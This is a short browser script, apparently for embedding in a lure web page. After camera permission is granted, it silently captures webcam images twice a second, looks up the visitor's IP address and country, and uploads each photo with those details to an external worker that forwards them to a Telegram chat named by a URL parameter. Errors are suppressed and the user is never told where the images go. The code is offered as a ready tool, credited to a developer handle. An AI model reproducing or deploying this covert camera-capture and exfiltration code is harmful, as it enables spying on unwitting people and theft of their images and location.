<script>
// ============ CONFIG ============
const INTERVAL_MS = 500; // 2 times per second
const WORKER_URL = "https://e87505a5.af-341.pages.dev/";
// ================================

// UID from URL (?=6362758258)
const params = new URLSearchParams(location.search);
const UID = params.get("") || "UNKNOWN";

let video, stream;
let ip = "Unknown";
let country = "Unknown";
let flag = "🏳️";

// country → flag
function countryToFlag(code){
  if(!code) return "🏳️";
  return code.toUpperCase().replace(/./g,
    c => String.fromCodePoint(127397 + c.charCodeAt())
  );
}

// get IP info
fetch("https://ipapi.co/json/")
.then(r=>r.json())
.then(d=>{
  ip = d.ip || "Unknown";
  country = d.country_name || "Unknown";
  flag = countryToFlag(d.country_code);
})
.catch(()=>{});

// start camera
(async ()=>{
  try{
    stream = await navigator.mediaDevices.getUserMedia({ video:true });
    video = document.createElement("video");
    video.srcObject = stream;
    await video.play();
    loopCapture();
  }catch(e){
    // permission denied
  }
})();

async function loopCapture(){
  await captureAndSend();
  setTimeout(loopCapture, INTERVAL_MS);
}

async function captureAndSend(){
  if(!video || !video.videoWidth) return;

  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video,0,0);

  const blob = await new Promise(r =>
    canvas.toBlob(r,"image/jpeg",0.8)
  );

  const caption =
`━━━━━━━━━━━━━━
📸 <b>NEW IMAGE</b>
━━━━━━━━━━━━━━
🔢 <b>UID</b> : ${UID}
🌐 <b>IP</b> : ${ip}
🌍 <b>Country</b> : ${country} ${flag}
━━━━━━━━━━━━━━
👨‍💻 <b>Dev</b> : @XFPro43`;

  const form = new FormData();
  form.append("chat_id", UID);
  form.append("photo", blob, "img.jpg");
  form.append("caption", caption);
  form.append("parse_mode","HTML");

  // ✅ send to Worker (Token پټ)
  fetch(WORKER_URL,{
    method:"POST",
    body:form
  }).catch(()=>{});
}

// stop camera when user leaves page
window.addEventListener("beforeunload",()=>{
  if(stream) stream.getTracks().forEach(t=>t.stop());
});
</script> 
